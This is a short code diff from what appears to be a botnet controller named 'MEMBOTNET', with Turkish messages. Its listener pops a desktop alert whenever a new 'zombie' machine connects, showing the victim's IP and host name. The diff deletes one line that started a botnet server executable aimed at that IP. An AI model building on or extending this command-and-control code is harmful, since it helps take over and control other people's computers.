@@ -94,7 +94,6 @@ def listen_loop():
         for i in all_addr:
             addrs += 1
         toast.show_toast(f"MEMBOTNET", f"Sunucu: {local}, Yeni zombi bağlandı!, hedef IP adres: {str(ip[0])}, hedef sistem ad: {host}, hedef tam adresler: {str(addrs)}",duration=6,icon_path=current_path+'/icons/ninja_icon.ico')
-        os.system(f"start {current_path}/server/botnet_server.exe 0 0 {str(ip[0])}")
 
 if listen_port == 0 and local == "0":
     menu()
